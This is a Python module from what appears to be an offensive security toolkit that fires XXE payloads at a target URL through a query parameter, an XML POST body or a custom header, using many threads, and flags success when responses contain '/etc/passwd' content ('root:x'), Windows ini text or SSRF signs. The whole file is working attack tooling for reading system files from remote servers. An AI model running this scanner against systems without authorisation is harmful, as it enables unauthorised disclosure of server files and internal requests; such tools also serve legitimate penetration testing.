import requests
import threading
from modules.funcs.console import print_success, print_warning, print_error

def f(url, payloads, method):
    detection_patterns = [
        "root:x",  # Common pattern for /etc/passwd
        "[extensions]",  # Pattern for Windows ini files
        "HTTP/1.1 200 OK"  # Generic HTTP pattern for SSRF
    ]
    
    results = []

    def send_get_request(payload):
        try:
            response = requests.get(f"{url}?xml={payload.strip()}")
            check_response(response, payload, "Method 1")
        except requests.exceptions.RequestException as e:
            print_error(f"Error (requests): {e}")

    def send_post_request(payload):
        try:
            headers = {'Content-Type': 'application/xml'}
            response = requests.post(url, data=payload.strip(), headers=headers)
            check_response(response, payload, "Method 2")
        except requests.exceptions.RequestException as e:
            print_error(f"Error (requests): {e}")

    def send_header_request(payload):
        try:
            headers = {'Content-Type': 'application/xml', 'X-XML': payload.strip()}
            response = requests.get(url, headers=headers)
            check_response(response, payload, "Method 3")
        except requests.exceptions.RequestException as e:
            print_error(f"Error (requests): {e}")

    def check_response(response, payload, method):
        if response.status_code == 200:
            for pattern in detection_patterns:
                if pattern in response.text:
                    result = f"Payload: {payload} - XXE Vulnerability FOUND! ({method})"
                    print_success(result)
                    results.append(result)
                    return
            print_error(f"Payload: {payload} - Not Vulnerable ({method})")
        else:
            print_error(f"HTTP Status Code: {response.status_code} ({method})")

    if method == '1':
        threads = []
        for payload in payloads:
            t = threading.Thread(target=send_get_request, args=(payload,))
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()

    elif method == '2':
        threads = []
        for payload in payloads:
            t = threading.Thread(target=send_post_request, args=(payload,))
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()

    elif method == '3':
        threads = []
        for payload in payloads:
            t = threading.Thread(target=send_header_request, args=(payload,))
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()

    else:
        print_error("Invalid method. Please enter '1', '2', or '3'.")
